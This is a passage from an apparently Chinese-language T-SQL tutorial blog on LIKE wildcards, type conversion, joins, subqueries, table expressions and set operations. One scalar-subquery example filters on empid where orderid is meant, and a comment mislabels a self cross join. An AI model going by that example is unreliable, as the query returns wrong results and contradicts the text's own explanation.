<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> empid, lastname</span><br><span class="line"><span class="keyword">FROM</span> HR.Employees</span><br><span class="line"><span class="keyword">WHERE</span> lastname <span class="keyword">LIKE</span> N<span class="string">'_e%'</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;③ <code>[&lt;字符列&gt;]</code>通配符：必须匹配指定字符中的一个字符<br>&emsp;&emsp;下面请求返回 lastname 以字符 A、B、C 开头的所有员工：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> empid, lastname</span><br><span class="line"><span class="keyword">FROM</span> HR.Employees</span><br><span class="line"><span class="keyword">WHERE</span> lastname <span class="keyword">LIKE</span> N<span class="string">'[ABC]%'</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;④ <code>[&lt;字符-字符&gt;]</code>通配符：必须匹配指定范围内中的一个字符<br>&emsp;&emsp;下面请求返回 lastname 以字符 A 到 E 开头的所有员工：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> empid, lastname</span><br><span class="line"><span class="keyword">FROM</span> HR.Employees</span><br><span class="line"><span class="keyword">WHERE</span> lastname <span class="keyword">LIKE</span> N<span class="string">'[A-E]%'</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;⑤ <code>[^&lt;字符-字符&gt;]</code>通配符：不属于特定字符序列或范围内的任意单个字符<br>&emsp;&emsp;下面请求返回 lastname 不以 A 到 E 开头的所有员工：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> empid, lastname</span><br><span class="line"><span class="keyword">FROM</span> HR.Employees</span><br><span class="line"><span class="keyword">WHERE</span> lastname <span class="keyword">LIKE</span> N<span class="string">'[^A-E]%'</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;⑥ <code>ESCAPE</code>转义字符<br>&emsp;&emsp;如果搜索包含特殊通配符的字符串（例如 <code>%</code>，<code>_</code>，<code>[</code>、<code>]</code>等），则必须使用转移字符。下面检查 lastname 列是否包含下划线：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> empid, lastname</span><br><span class="line"><span class="keyword">FROM</span> HR.Employees</span><br><span class="line"><span class="keyword">WHERE</span> lastname <span class="keyword">LIKE</span> N<span class="string">'%!_%'</span> ESCAPE <span class="string">'!'</span>;</span><br></pre></td></tr></table></figure>

<p>（10）两种转换值的函数：<code>CAST</code>和<code>CONVERT</code><br>&emsp;&emsp;<code>CAST</code>和<code>CONVERT</code>都用于转换值的数据类型。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CAST</span>(SYSDATETIME() <span class="keyword">AS</span> <span class="built_in">DATE</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CONVERT</span>(<span class="built_in">CHAR</span>(<span class="number">8</span>),<span class="keyword">CURRENT_TIMESTAMP</span>,<span class="number">112</span>);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;需要注意的是，<code>CAST</code>是 ANSI 标准的 SQL，而<code>CONVERT</code>不是。所以，除非需要使用样式值，否则<strong>推荐优先使用<code>CAST</code>函数，以保证代码尽可能与标准兼容。</strong></p>
<h2 id="联接查询"><a href="#联接查询" class="headerlink" title="联接查询"></a>联接查询</h2><p>（1）交叉联接：返回笛卡尔积，即 m*n 行的结果集</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- CROSS JOIN</span></span><br><span class="line"><span class="keyword">select</span> c.custid, e.empid</span><br><span class="line"><span class="keyword">from</span> sales.Customers <span class="keyword">as</span> c</span><br><span class="line">    <span class="keyword">cross</span> <span class="keyword">join</span> HR.Employees <span class="keyword">as</span> e;</span><br><span class="line"><span class="comment">-- INNER CROSS JOIN    </span></span><br><span class="line"><span class="keyword">select</span> e1.empid,e1.firstname,e1.lastname,</span><br><span class="line">    e2.empid,e2.firstname,e2.lastname</span><br><span class="line"><span class="keyword">from</span> hr.Employees <span class="keyword">as</span> e1</span><br><span class="line">    <span class="keyword">cross</span> <span class="keyword">join</span> hr.Employees <span class="keyword">as</span> e2;</span><br></pre></td></tr></table></figure>

<p>（2）内联接：先笛卡尔积，然后根据指定的谓词对结果进行过滤</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> e.empid,e.firstname,e.lastname,o.orderid</span><br><span class="line"><span class="keyword">from</span> hr.Employees <span class="keyword">as</span> e</span><br><span class="line">    <span class="keyword">join</span> sales.Orders <span class="keyword">as</span> o</span><br><span class="line">    <span class="keyword">on</span> e.empid=o.empid;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>&emsp;&emsp;虽然不使用<code>JOIN</code>这种 ANSI SQL-92 标准语法也可以实现联接，但强烈推荐使用 ANSI SQL-92 标准，因为它用起来更加安全。比如，假如你要写一条内联接查询，如果不小心忘记了指定联接条件，如果这时候用的是 ANSI SQL-92 语法，那么语法分析器将会报错。</p>
</blockquote>
<figure class="image-box">
                <img src="5.png" alt title class>
                <p></p>
            </figure>

<p>（3）外联结：笛卡尔积 → 对结果过滤 → 添加外部行<br>&emsp;&emsp;通过例子来理解外联结：根据客户的客户 ID 和订单的客户 ID 来对 Customers 表和 Orders 表进行联接，并返回客户和他们的订单信息。该查询语句使用的联接类型是左外连接，所以查询结果也包括那些没有发出任何订单的客户；</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--LEFT OUTER JOIN</span></span><br><span class="line"><span class="keyword">select</span> c.custid,c.companyname,o.orderid</span><br><span class="line"><span class="keyword">from</span> sales.Customers <span class="keyword">as</span> c</span><br><span class="line">  <span class="keyword">left</span> <span class="keyword">outer</span> <span class="keyword">join</span> sales.Orders <span class="keyword">as</span> o</span><br><span class="line">  <span class="keyword">on</span> c.custid=o.custid;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;另外，需要注意的是在对外联结中非保留值得列值进行过滤时，不要在<code>WHERE</code>子句中指定错误的查询条件。<br>&emsp;&emsp;例如，下面请求返回在 2007 年 2 月 12 日下过订单的客户，以及他们的订单。同时也返回在 2007 年 2 月 12 日没有下过订单的客户。这是一个典型的左外连接的案例，但是我们经常会犯这样的错误：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> c.custid,c.companyname,o.orderid,o.orderdate</span><br><span class="line"><span class="keyword">from</span> sales.Customers <span class="keyword">as</span> c</span><br><span class="line">    <span class="keyword">left</span> <span class="keyword">outer</span> <span class="keyword">join</span> sales.Orders <span class="keyword">as</span> o</span><br><span class="line">    <span class="keyword">on</span> c.custid=o.custid </span><br><span class="line"><span class="keyword">where</span> o.orderdate=<span class="string">'20070212'</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;执行结果如下：</p>
<figure class="image-box">
                <img src="6.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这是因为对于所有的外部行，因为它们在 o.orderdate 列上的取值都为 <em>NULL</em> ，所以<code>WHERE</code>子句中条件 o.orderdate=’20070212’ 的计算结果为 <em>UNKNOWN</em> ，因此<code>WHERE</code>子句会过滤掉所有的外部行。<br>&emsp;&emsp;我们应该将这个条件搬到<code>on</code>后边：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> c.custid,c.companyname,o.orderid,o.orderdate</span><br><span class="line"><span class="keyword">from</span> sales.Customers <span class="keyword">as</span> c</span><br><span class="line">    <span class="keyword">left</span> <span class="keyword">outer</span> <span class="keyword">join</span> sales.Orders <span class="keyword">as</span> o</span><br><span class="line">    <span class="keyword">on</span> c.custid=o.custid </span><br><span class="line">        <span class="keyword">and</span> o.orderdate=<span class="string">'20070212'</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这下的执行结果如下：</p>
<figure class="image-box">
                <img src="7.png" alt title class>
                <p></p>
            </figure>

<h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><p>（1）独立子查询：不依赖于它所属的外部查询<br>&emsp;&emsp;例如下面要查询 Orders 表中订单 ID 最大的订单信息，这种叫做 独立标量子查询，即返回值不能超过一个。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> orderid, orderdate, empid, custid</span><br><span class="line"><span class="keyword">from</span> sales.Orders</span><br><span class="line"><span class="keyword">where</span> empid=(<span class="keyword">select</span> <span class="keyword">MAX</span>(o.orderid) <span class="keyword">from</span> sales.Orders <span class="keyword">as</span> o);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;下面请求查询返回姓氏以字符 D 开头的员工处理过的订单的 ID，这种叫做 独立多值子查询，即返回值可能有多个。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> orderid</span><br><span class="line"><span class="keyword">from</span> sales.Orders</span><br><span class="line"><span class="keyword">where</span> empid <span class="keyword">in</span> (<span class="keyword">select</span> e.empid </span><br><span class="line">    <span class="keyword">from</span> hr.Employees <span class="keyword">as</span> e</span><br><span class="line">    <span class="keyword">where</span> e.lastname <span class="keyword">like</span> N<span class="string">'D%'</span>);</span><br></pre></td></tr></table></figure>

<p>（2）相关子查询：必须依赖于它所属的外部查询，不能独立地调用它<br>&emsp;&emsp;例如下面的查询会返回每个客户的订单记录中订单 ID 最大的记录：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> custid, orderid, orderdate, empid</span><br><span class="line"><span class="keyword">from</span> sales.Orders <span class="keyword">as</span> o1</span><br><span class="line"><span class="keyword">where</span> orderid=(<span class="keyword">select</span> <span class="keyword">MAX</span>(o2.orderid) </span><br><span class="line">    <span class="keyword">from</span> sales.Orders <span class="keyword">as</span> o2</span><br><span class="line">    <span class="keyword">where</span> o2.custid=o1.custid);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;简单地说，对于 o1 表中的每一行，子查询负责返回当前客户的最大订单 ID。如果 o1 表中某行的订单 ID 和子查询返回的订单 ID 匹配，那么 o1 中的这个订单 ID 就是当前客户的最大订单 ID，在这种情况下，查询便会返回 o1 表中的这个行。</p>
<p>（3）<code>EXISTS</code>谓词：它的输入是一个查询，如果子查询能够返回任何行，则返回 <em>True</em> ，否则返回 <em>False</em><br>&emsp;&emsp;例如下面的查询会返回下过订单的西班牙客户：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> custid, companyname</span><br><span class="line"><span class="keyword">from</span> sales.customers <span class="keyword">as</span> c</span><br><span class="line"><span class="keyword">where</span> c.country=N<span class="string">'Spain'</span> <span class="keyword">and</span> <span class="keyword">exists</span> (</span><br><span class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> sales.Orders <span class="keyword">as</span> o</span><br><span class="line">    <span class="keyword">where</span> o.custid=c.custid);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;同样，要查询没有下过订单的西班牙客户只需要加上<code>NOT</code>即可：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> custid, companyname</span><br><span class="line"><span class="keyword">from</span> sales.customers <span class="keyword">as</span> c</span><br><span class="line"><span class="keyword">where</span> c.country=N<span class="string">'Spain'</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="keyword">exists</span> (</span><br><span class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> sales.Orders <span class="keyword">as</span> o</span><br><span class="line">    <span class="keyword">where</span> o.custid=c.custid);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>&emsp;&emsp;对于<code>EXISTS</code>，它采用的是二值逻辑（ <em>TRUE</em> 和 <em>FALSE</em> ），它只关心是否存在匹配行，而不考虑<code>SELECT</code>列表中指定的列，并且无须处理所有满足条件的行。可以将这种处理方式看做是一种“短路”，它<strong>能够提高处理效率</strong>。  　<br>&emsp;&emsp;另外，由于<code>EXISTS</code>采用的是二值逻辑，因此相较于<code>IN</code>要更加安全，可以避免对 <em>NULL</em> 值的处理。　</p>
</blockquote>
<p>（4）高级子查询<br>&emsp;&emsp;① 如何表示前一个或后一个记录？逻辑等式：上一个 -&gt; 小于当前值的最大值；下一个 -&gt; 大于当前值的最小值；</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 上一个订单ID</span></span><br><span class="line"><span class="keyword">select</span> orderid, orderdate, empid, custid,</span><br><span class="line">(</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">MAX</span>(o2.orderid) </span><br><span class="line"><span class="keyword">from</span> sales.Orders <span class="keyword">as</span> o2</span><br><span class="line"><span class="keyword">where</span> o2.orderid&lt;o1.orderid</span><br><span class="line">) <span class="keyword">as</span> prevorderid </span><br><span class="line"><span class="keyword">from</span> sales.Orders <span class="keyword">as</span> o1;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;② 如何实现连续聚合函数？在子查询中连续计算</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 连续聚合</span></span><br><span class="line"><span class="keyword">select</span> orderyear, qty, </span><br><span class="line">(<span class="keyword">select</span> <span class="keyword">SUM</span>(o2.qty) </span><br><span class="line"> <span class="keyword">from</span> sales.OrderTotalsByYear <span class="keyword">as</span> o2</span><br><span class="line"> <span class="keyword">where</span> o2.orderyear&lt;=o1.orderyear) <span class="keyword">as</span> runqty </span><br><span class="line"><span class="keyword">from</span> sales.OrderTotalsByYear <span class="keyword">as</span> o1</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> orderyear;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;执行结果如下图所示：</p>
<figure class="image-box">
                <img src="8.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;③ 使用<code>NOT EXISTS</code>谓词取代<code>NOT IN</code>隐式排除 <em>NULL</em> 值：当对至少返回一个 <em>NULL</em> 值的子查询使用<code>NOT IN</code>谓词时，外部查询总会返回一个空集。（前面提到，<code>EXISTS</code>谓词采用的是二词逻辑而不是三词逻辑）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 隐式排除NULL值</span></span><br><span class="line"><span class="keyword">select</span> custid,companyname <span class="keyword">from</span> sales.Customers <span class="keyword">as</span> c</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span></span><br><span class="line">(<span class="keyword">select</span> * </span><br><span class="line"> <span class="keyword">from</span> sales.Orders <span class="keyword">as</span> o</span><br><span class="line"> <span class="keyword">where</span> o.custid=c.custid);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;又如以下查询请求返回每个客户在 2007 年下过订单而在 2008 年没有下过订单的客户：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> custid, companyname</span><br><span class="line"><span class="keyword">from</span> sales.Customers <span class="keyword">as</span> c</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">exists</span> </span><br><span class="line">(<span class="keyword">select</span> * <span class="keyword">from</span> sales.Orders <span class="keyword">as</span> o1</span><br><span class="line"> <span class="keyword">where</span> c.custid=o1.custid </span><br><span class="line"> <span class="keyword">and</span> o1.orderdate&gt;=<span class="string">'20070101'</span> <span class="keyword">and</span> o1.orderdate&lt;<span class="string">'20080101'</span>)</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">not</span> <span class="keyword">exists</span> </span><br><span class="line">(<span class="keyword">select</span> * <span class="keyword">from</span> sales.Orders <span class="keyword">as</span> o2</span><br><span class="line"> <span class="keyword">where</span> c.custid=o2.custid</span><br><span class="line"> <span class="keyword">and</span> o2.orderdate&gt;=<span class="string">'20080101'</span> <span class="keyword">and</span> o2.orderdate&lt;<span class="string">'20090101'</span>);</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="表表达式"><a href="#表表达式" class="headerlink" title="表表达式"></a>表表达式</h1><p>&emsp;&emsp;表表达式是一种命名的查询表达式，代表一个有效的关系表。可以像其他表一样，在数据处理中使用表表达式。MSSQL 中支持 4 种类型的表表达式：</p>
<h2 id="派生表"><a href="#派生表" class="headerlink" title="派生表"></a>派生表</h2><p>&emsp;&emsp;派生表（也称为表子查询）是在外部查询的 FROM 子句中定义的，只要外部查询一结束，派生表也就不存在了。<br>&emsp;&emsp;例如下面代码定义了一个名为 USACusts 的派生表，它是一个返回所有美国客户的查询。外部查询则选择了派生表的所有行。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *</span><br><span class="line"><span class="keyword">from</span> (<span class="keyword">select</span> custid, companyname </span><br><span class="line">      <span class="keyword">from</span> sales.Customers </span><br><span class="line">      <span class="keyword">where</span> country=<span class="string">'USA'</span>) <span class="keyword">as</span> USACusts;</span><br></pre></td></tr></table></figure>

<h2 id="公用表表达式"><a href="#公用表表达式" class="headerlink" title="公用表表达式"></a>公用表表达式</h2><p>&emsp;&emsp;公用表达式（简称 CTE，Common Table Expression）是和派生表很相似的另一种形式的表表达式，是 ANSI SQL（1999 及以后版本）标准的一部分。<br>&emsp;&emsp;举个栗子，下面的代码定义了一个名为 USACusts 的 CTE，它的内部查询返回所有来自美国的客户，外部查询则选择了 CTE 中的所有行：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WITH</span> USACusts <span class="keyword">AS</span></span><br><span class="line">(</span><br><span class="line">    <span class="keyword">select</span> custid, companyname</span><br><span class="line">    <span class="keyword">from</span> sales.Customers </span><br><span class="line">    <span class="keyword">where</span> country=N<span class="string">'USA'</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> USACusts;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;和派生表一样，一旦外部查询完成，CTE 的生命周期也就结束了。</p>
<h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><p>&emsp;&emsp;派生表和 CTE 都是不可重用的，而视图和内联表值函数却是可重用，它们的定义存储在一个数据库对象中，一旦创建，这些对象就是数据库的永久部分。只有用删除语句显式地删除，它们才会从数据库中移除。<br>&emsp;&emsp;下面仍然继续上面的例子，创建一个视图：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">IF OBJECT_ID('Sales.USACusts') IS NOT NULL</span><br><span class="line">   <span class="keyword">DROP</span> <span class="keyword">VIEW</span> Sales.USACusts;</span><br><span class="line">GO</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> Sales.USACusts</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    custid, companyname, contactname, contacttitle, address,</span><br><span class="line">    city, region, postalcode, country, phone, fax</span><br><span class="line"><span class="keyword">FROM</span> Sales.Customers</span><br><span class="line"><span class="keyword">WHERE</span> country=N<span class="string">'USA'</span>;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;使用该视图：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Sales.USACusts;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;执行结果如下：</p>
<figure class="image-box">
                <img src="9.png" alt title class>
                <p></p>
            </figure>

<h2 id="内联表值函数"><a href="#内联表值函数" class="headerlink" title="内联表值函数"></a>内联表值函数</h2><p>&emsp;&emsp;内联表值函数能够支持输入参数，其他方面就与视图类似了。<br>&emsp;&emsp;下面演示如何创建函数：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">IF OBJECT_ID('dbo.fn_GetCustOrders') IS NOT NULL</span><br><span class="line">   <span class="keyword">DROP</span> <span class="keyword">FUNCTION</span> dbo.fn_GetCustOrders;</span><br><span class="line">GO</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> dbo.fn_GetCustOrders</span><br><span class="line">    (@cid <span class="keyword">AS</span> <span class="built_in">INT</span>) <span class="keyword">RETURNS</span> <span class="keyword">TABLE</span></span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">RETURN</span> </span><br><span class="line">    <span class="keyword">SELECT</span></span><br><span class="line">        orderid, custid, empid, orderdate, requireddate,</span><br><span class="line">        shippeddate, shipperid, freight, shipname, shipaddress, shipcity,</span><br><span class="line">        shipregion, shippostalcode, shipcountry</span><br><span class="line">    <span class="keyword">FROM</span> Sales.Orders</span><br><span class="line">    <span class="keyword">WHERE</span> custid=@cid;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;如何使用函数：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> orderid, custid</span><br><span class="line"><span class="keyword">FROM</span> dbo.fn_GetCustOrders(<span class="number">1</span>) <span class="keyword">AS</span> CO;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;执行结果如下：</p>
<figure class="image-box">
                <img src="10.png" alt title class>
                <p></p>
            </figure>

<blockquote>
<p><strong>总结</strong>：<br>&emsp;&emsp;借助表表达式可以简化代码，提高代码地可维护性，还可以封装查询逻辑。<br>&emsp;&emsp;当需要使用表表达式，而且不计划重用它们的定义时，可以使用派生表或 CTE，与派生表相比，CTE 更加模块化，更容易维护。<br>&emsp;&emsp;当需要定义可重用的表表达式时，可以使用视图或内联表值函数。如果不需要支持输入，则使用视图；反之，则使用内联表值函数。</p>
</blockquote>
<hr>
<h1 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h1><h2 id="UNION-并集运算"><a href="#UNION-并集运算" class="headerlink" title="UNION 并集运算"></a>UNION 并集运算</h2><figure class="image-box">
                <img src="11.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;在 T-SQL 中，<code>UNION</code>集合运算可以将两个输入查询的结果组合成一个结果集。需要注意的是：如果一个行在任何一个输入集合众出现，它也会在<code>UNION</code>运算的结果中出现。T-SQL 支持以下两种选项：<br>（1）<code>UNION ALL</code>：不会删除重复行</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- union all</span></span><br><span class="line"><span class="keyword">select</span> country, region, city <span class="keyword">from</span> hr.Employees</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> country, region, city <span class="keyword">from</span> sales.Customers;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;结果得到 100 行：</p>
<figure class="image-box">
                <img src="12.png" alt title class>
                <p></p>
            </figure>

<p>（2）<code>UNION</code>：会删除重复行</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- union</span></span><br><span class="line"><span class="keyword">select</span> country, region <span class="keyword">from</span> hr.Employees</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line"><span class="keyword">select</span> country, region <span class="keyword">from</span> sales.Customers;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;结果得到 34 行：</p>
<figure class="image-box">
                <img src="13.png" alt title class>
                <p></p>
            </figure>

<h2 id="INTERSECT-交集运算"><a href="#INTERSECT-交集运算" class="headerlink" title="INTERSECT 交集运算"></a>INTERSECT 交集运算</h2><figure class="image-box">
                <img src="14.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;在 T-SQL 中，<code>INTERSECT</code>集合运算对两个输入查询的结果取其交集，只返回在两个查询结果集中都出现的行。<br>&emsp;&emsp;<code>INTERSECT</code>集合运算在逻辑上会首先删除两个输入集中的重复行，然后返回只在两个集合中中都出现的行。换句话说：如果一个行在两个输入集中都至少出现一次，那么交集返回的结果中将包含这一行。<br>&emsp;&emsp;例如，下面返回既是雇员地址，又是客户地址的不同地址：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- intersect</span></span><br><span class="line"><span class="keyword">select</span> country, region, city <span class="keyword">from</span> hr.Employees</span><br><span class="line"><span class="keyword">intersect</span></span><br><span class="line"><span class="keyword">select</span> country, region, city <span class="keyword">from</span> sales.Customers;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;执行结果如下图所示：</p>
<figure class="image-box">
                <img src="15.png" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>&emsp;&emsp;这里需要说的是，集合运算对行进行比较时，<strong>认为两个 NULL 值相等</strong>，所以就返回该行记录。</p>
</blockquote>
<h2 id="EXCEPT-差集运算"><a href="#EXCEPT-差集运算" class="headerlink" title="EXCEPT 差集运算"></a>EXCEPT 差集运算</h2><figure class="image-box">
                <img src="16.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;在 T-SQL 中，集合之差使用<code>EXCEPT</code>集合运算实现的。它对两个输入查询的结果集进行操作，返回出现在第一个结果集中，但不出现在第二个结果集中的所有行。<br>&emsp;&emsp;<code>EXCEPT</code>结合运算在逻辑上首先删除两个输入集中的重复行，然后返回只在第一个集合中出现，在第二个结果集中不出现的所有行。换句话说：一个行能够被返回，仅当这个行在第一个输入的集合中至少出现过一次，而且在第二个集合中一次也没出现过。<br>&emsp;&emsp;此外，相比<code>UNION</code>和<code>INTERSECT</code>，两个输入集合的顺序是会影响到最后返回结果的。<br>&emsp;&emsp;例如，借助<code>EXCEPT</code>运算，我们可以方便地实现属于 A 但不属于 B 的场景，下面返回属于员工地址，但不属于客户地址的地址记录：</p>
